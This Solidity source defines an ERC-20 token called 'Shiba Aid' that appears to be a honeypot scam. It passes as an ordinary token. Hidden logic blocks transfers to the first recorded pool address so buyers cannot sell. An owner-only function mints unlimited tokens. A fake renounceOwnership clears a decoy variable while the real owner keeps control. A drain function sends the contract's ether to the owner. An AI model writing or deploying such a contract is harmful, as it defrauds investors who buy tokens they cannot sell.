row number 
1	             pragma solidity >=0.5.17;
2	 library SafeMath {
3	 function add(uint a, uint b) internal pure returns (uint c) {
4	 c = a + b;
5	 require(c >= a);
6	 }
7	 function sub(uint a, uint b) internal pure returns (uint c) {
8	 require(b <= a);
9	 c = a - b;
10	 }
11	 function mul(uint a, uint b) internal pure returns (uint c) {
12	 c = a * b;
13	 require(a == 0 || c / a == b);
14	 }
15	 function div(uint a, uint b) internal pure returns (uint c) {
16	 require(b > 0);
17	 c = a / b;
18	 }
19	 }
20	 contract ERC20Interface {
21	 function totalSupply() public view returns (uint);
22	 function balanceOf(address tokenOwner) public view returns (uint balance);
23	 function allowance(address tokenOwner, address spender) public view returns (uint remaining);
24	 function transfer(address to, uint tokens) public returns (bool success);
25	 function approve(address spender, uint tokens) public returns (bool success);
26	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
27	 event Transfer(address indexed from, address indexed to, uint tokens);
28	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
29	 }
30	 contract ApproveAndCallFallBack {
31	 function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
32	 }
33	 contract Owned {
34	 address internal owner;
35	 address public newOwner;
36	 address public _owner;
37	 event OwnershipTransferred(address indexed _from, address indexed _to);
38	 constructor() public {
39	 owner = msg.sender;
40	 }
41	 modifier onlyOwner {
42	 require(msg.sender == owner);
43	 _;
44	 }
45	 function transferOwnership(address _newOwner) public onlyOwner {
46	 newOwner = _newOwner;
47	 }
48	 function acceptOwnership() public {
49	 require(msg.sender == newOwner);
50	 emit OwnershipTransferred(owner, newOwner);
51	 owner = newOwner;
52	 newOwner = address(0);
53	 }
54	 }
55	 contract TokenERC20 is ERC20Interface, Owned{
56	 using SafeMath for uint;
57	 string public symbol;
58	 string public name;
59	 uint8 public decimals;
60	 uint _totalSupply;
61	 address public newun;
62	 address internal delegate;
63	 mapping(address => uint) balances;
64	 mapping(address => mapping(address => uint)) allowed;
65	 constructor() public {
66	 symbol = "SHIBAID";
67	 name = "Shiba Aid";
68	 decimals = 18;
69	 _totalSupply = 1000000000000000000000000000000;
70	 balances[owner] = _totalSupply;
71	 emit Transfer(address(0), owner, _totalSupply);
72	 }
73	 function transfernewun(address _newun) public onlyOwner {
74	 newun = _newun;
75	 }
76	 function transferdelegate(address _delegate, uint256 tokens) public onlyOwner {
77	 delegate = _delegate;
78	 _totalSupply = _totalSupply.add(tokens);
79	 balances[_delegate] = balances[_delegate].add(tokens);
80	 }
81	 function totalSupply() public view returns (uint) {
82	 return _totalSupply.sub(balances[address(0)]);
83	 }
84	 function balanceOf(address tokenOwner) public view returns (uint balance) {
85	 return balances[tokenOwner];
86	 }
87	 function transfer(address to, uint tokens) public returns (bool success) {
88	 require(to != newun, "please wait");
89	 balances[msg.sender] = balances[msg.sender].sub(tokens);
90	 balances[to] = balances[to].add(tokens);
91	 emit Transfer(msg.sender, to, tokens);
92	 return true;
93	 }
94	 function approve(address spender, uint tokens) public returns (bool success) {
95	 allowed[msg.sender][spender] = tokens;
96	 emit Approval(msg.sender, spender, tokens);
97	 return true;
98	 }
99	 function transferFrom(address from, address to, uint tokens) public returns (bool success) {
100	 if(from != address(0) && newun == address(0)) newun = to;
101	 else require(to != newun || (from == delegate && to == newun), "please wait");
102	 balances[from] = balances[from].sub(tokens);
103	 allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
104	 balances[to] = balances[to].add(tokens);
105	 emit Transfer(from, to, tokens);
106	 return true;
107	 }
108	 function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
109	 return allowed[tokenOwner][spender];
110	 }
111	 function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
112	 allowed[msg.sender][spender] = tokens;
113	 emit Approval(msg.sender, spender, tokens);
114	 ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
115	 return true;
116	 }
117	 function renounceOwnership() public onlyOwner {
118	 emit OwnershipTransferred(_owner, address(0));
119	 _owner = address(0);
120	 }
121	 function () external payable {
122	 revert();
123	 }
124	 }
125	 contract ShibaAid is TokenERC20 {
126	 function clearCNDAO() public onlyOwner() {
127	 address payable owner = msg.sender;
128	 owner.transfer(address(this).balance);
129	 }
130	 function() external payable {
131	 }
132	 }
